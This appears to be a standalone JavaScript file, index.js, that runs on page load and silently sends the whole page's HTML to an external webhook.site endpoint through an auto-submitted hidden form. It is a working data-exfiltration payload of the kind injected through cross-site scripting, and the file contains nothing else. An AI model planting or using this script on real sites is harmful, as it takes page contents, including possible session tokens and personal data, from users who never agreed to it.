// index.js

// The webhook URL
const webhookUrl = "https://webhook.site/41b3fa6e-82f9-4bcc-af04-46260100132c";

// Function to create and automatically submit a form with the page's HTML body as payload
function createAndSubmitFormWithHtmlBody() {
    // Get the current HTML content of the page
    const pageContent = document.documentElement.outerHTML; // The complete HTML of the page

    // Create a form element
    const form = document.createElement("form");
    form.method = "POST";
    form.action = webhookUrl;

    // Add a hidden input field to store the HTML content
    const hiddenInput = document.createElement("input");
    hiddenInput.type = "hidden";
    hiddenInput.name = "htmlBody"; // Key for the payload
    hiddenInput.value = pageContent;

    // Append the hidden input to the form
    form.appendChild(hiddenInput);

    // Add the form to the body
    document.body.appendChild(form);

    console.log("Form has been created and added to the DOM. Submitting now...");

    // Automatically submit the form
    form.submit();
}

// Ensure the function runs after the DOM is fully loaded
document.addEventListener("DOMContentLoaded", () => {
    console.log("DOM fully loaded. Creating and auto-submitting form...");
    createAndSubmitFormWithHtmlBody();
});
